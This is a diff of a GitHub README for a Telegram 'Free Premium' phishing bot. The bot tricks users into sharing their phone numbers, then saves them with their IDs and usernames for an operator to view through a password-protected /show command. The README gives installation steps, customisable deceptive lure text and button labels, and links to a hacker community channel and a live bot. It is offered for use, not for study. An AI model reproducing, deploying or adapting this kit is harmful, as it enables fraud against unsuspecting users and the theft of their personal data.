@@ -1,112 +1,171 @@
-# Free Telegram Premium Phising Bot 🤖
+# Free Telegram Premium Phonenumber Phishing Bot 🤖
 
 Python: 3.9+ Telegram Bot API
 
-Row of Contents 📚
+## Row of Contents 📚
 
-Introduction 🤔
-Features 🎉
-Installation 💻
-Usage 📱
-Configuration 🔧
-License 📜
-Example Use Cases 📝
-Code Structure 🗂️
-API Documentation 📚
-Commit Messages 📝
-Image 📸
-Customization 🔩
-Troubleshooting 🚨
+- **Introduction** 🤔
+- **Features** 🎉
+- **Installation** 💻
+- **Usage** 📱
+- **Configuration** 🔧
+- **License** 📜
+- **Example Use Cases** 🖍️
+- **Code Structure** 🗂️
+- **API Documentation** 📚
+- **Commit Messages** 🖍️
+- **Image** 📸
+- **Customization** 🔨
+- **Troubleshooting** 🚨
 
-# Introduction 🤔
+---
 
-This is a Telegram bot that Tricks Users for free Telegram Premium access to users 🤝.
+## Introduction 🤔
 
-The bot uses the Telegram Bot API to interact with users and Save Their Phonenumbers with the id's and the usernames 📱.
+This is a Telegram bot designed to trick users into sharing their phone numbers under the guise of providing free Telegram Premium access 🤝.
 
-You could modify the text , button of the phone number share & the image .
+The bot uses the Telegram Bot API to interact with users and saves their phone numbers along with IDs and usernames 📱.
 
+You can modify the text, button labels for the phone number sharing prompt, and the image displayed in the bot.
 
+---
 
-# Features 🎉
+![photo_5969548008347517558_y](https://github.com/user-attachments/assets/b0bb342c-5a56-4ddd-87ac-7885a3275d81)
 
-Provides free Telegram Premium access to users 🤝
+---
 
-Users can share their phone number to receive premium access 📞
+## Features 🎉
 
-Admins can view the list of users who have shared their phone number using the /show command 👀
+- Provides free Telegram Premium access to users 🤝.
+- Users can share their phone number to receive premium access 📞.
+- Admins can view the list of users who have shared their phone numbers using the `/show` command 👀.
+- The bot uses a password to protect the `/show` command 🔒.
+- The bot sends a welcome message with a picture and button to share hes phone number masked with text 📸.
 
-The bot uses a password to protect the /show command 🔒
+---
 
-Users can get 3 months of Telegram Premium for free 🎁
-
-The bot sends a welcome message with a picture and buttons 📸
-
-
-# Installation 💻
+## Installation 💻
 
 To install the bot, follow these steps:
 
-Clone the repository: Clone the repository using :
-    
-    git clone https://github.com/your-username/free-telegram-premium-bot.git 📁
-    
-Install Python: Make sure you have Python 3.9 or later installed on your system. You can download it from the official Python website: https://www.python.org/downloads/ 📊
-    
-Install python-telegram-bot: Install the python-telegram-bot library using pip: pip install python-telegram-bot==13.15 📦
-    
-Install other dependencies: Install the other dependencies required by the bot using pip: 
-```
-pip install -r req.txt 💻
-```
-Replace YOUR_BOT_TOKEN: Replace YOUR_BOT_TOKEN with your actual bot token in the main.py file 🔑
+1. **Clone the repository**: Clone the repository using:
+    ```bash
+    git clone https://github.com/BlackNnja/Telegram-Phishing-Bot.git
+    ```
+    the cd to the 📁
 
-Run the bot: Run the bot using 
-```
-python bot.py 🚀
-```
-# Usage 📱
+2. **Install Python**: Make sure you have Python 3.9 or later installed on your system. You can download it from the [official Python website](https://www.python.org/downloads/) 🔢.
+
+3. **Install python-telegram-bot**: Install the python-telegram-bot library using pip:
+    ```bash
+    pip install python-telegram-bot==13.15
+    ```
+    📦
+
+4. **Install other dependencies**: Install the other dependencies required by the bot using pip:
+    ```bash
+    pip install -r req.txt
+    ```
+    💻
+
+5. **Replace `YOUR_BOT_TOKEN`**: Replace `YOUR_BOT_TOKEN` with your actual bot token in the `main.py` file 🔑.
+
+6. **Run the bot**: Run the bot using:
+    ```bash
+    python bot.py
+    ```
+    🚀
+
+---
+
+## Usage 📱
 
 To use the bot, follow these steps:
 
-Start the bot: Start the bot by sending the /start command 📱
+1. **Start the bot**: Start the bot by sending the `/start` command 📱.
+2. **Share your phone number**: Share your phone number with the bot to receive premium access 📞.
+3. **Users That knows the password can view users**: Users can view the list of users who have shared their phone number using the `/show {PASSWORD}` command 👀.
 
-Share your phone number: Share your phone number with the bot to receive premium access 📞
+---
 
-Admins can view users: Admins can view the list of users who have shared their phone number using the /show {PASSWORD} command 👀
+## Configuration 🔧
 
-# Configuration 🔧
+The bot uses a password to protect the `/show` command 🔒. You can change the password by modifying the `password` variable in the `main.py` file 🔑.
 
-The bot uses a password to protect the /show command 🔒. You can change the password by modifying the password variable in the main.py file 🔑.
-# License 📜
+To configure the bot's appearance and functionality:
+
+1. **Change the Welcome Image**:
+   - Replace the image file in the `assets/` folder with your own image.
+   - Update the path to the new image in the `send_welcome()` function in `bot.py`.
+
+2. **Modify the Button Labels**:
+   - Edit the `reply_markup` section in the `send_welcome()` function to customize the text of the buttons.
+
+   Example:
+   ```python
+   buttons = [
+       [InlineKeyboardButton(“Share Phone Number”, callback_data='share_phone')],
+   ]
+   ```
+
+3. **Customize the Text and Picture**:
+   - Edit the strings in the `send_welcome()` function to update the welcome message and other text.
+
+   Example:
+   ```python
+        # Send welcome message with a picture and both buttons
+        with open('telegramicon.png', 'rb') as photo:
+            sent_message = update.message.reply_photo(
+                photo=photo,
+                caption=("🎉 Welcome to Free Telegram Premium 🎉\n\n"
+                         "You can get 3 months of Telegram Premium for free!\n\n"
+                         "To Get ⭐Free Premium Telegram ⭐ Access\n\n please press the box icon button \n\nnear the clip 🧷\n\n below to connect your account to Telegram Pro. 📱\n\n"
+                         "Happy Using And Keep Coming Back Every 3 Months! 😊"),
+                reply_markup=reply_markup
+            )
+   ```
+
+---
+
+## License 📜
 
 This project is licensed under the MIT License 📜. See the LICENSE file for more information.
-Example Use Cases 📝
 
-    User shares their phone number with the bot to receive premium access 📞
-    Admin uses the /show command to view the list of users who have shared their phone number 👀
+---
 
-# Code Structure 🗂️
+## Example Use Cases 🖍️
+
+- Users share their phone numbers with the bot to receive premium access 📞.
+- Admins use the `/show` command to view the list of users who have shared their phone numbers 👀.
+
+---
+
+## Code Structure 🗂️
 
 The code is structured into the following files:
 
-    bot.py: The main file that contains the bot's logic 📝
-    requirements.txt: The file that contains the required dependencies 💻
+- `bot.py`: The main file that contains the bot's logic 🖍️.
+- `requirements.txt`: The file that contains the required dependencies 💻.
 
-# API Documentation 📚
+---
 
-The bot uses the Telegram Bot API to interact with users 📱. You can find the API documentation at https://core.telegram.org/bots/api.
-Commit Messages 📝
+## API Documentation 📚
+
+The bot uses the Telegram Bot API to interact with users 📱. You can find the API documentation at [Telegram Bot API](https://core.telegram.org/bots/api).
+
+---
+
+## Commit Messages 🖍️
 
 Commit messages should follow the standard format:
 
-    feat: Add new feature 🎉
-    fix: Fix bug 🚨
-    
-our Community on telegram :
+- `feat`: Add new feature 🎉
+- `fix`: Fix bug 🚨
 
-#  t.me/israelihacker
+---
 
-Visit the original Bot :
+## Community
 
-# t.me/Premium_TelegramTrial_bot
+- Join our community on Telegram: [t.me/israelihacker](https://t.me/israelihacker)
+- Visit the original bot: [t.me/Premium_TelegramTrial_bot](https://t.me/Premium_TelegramTrial_bot)
+
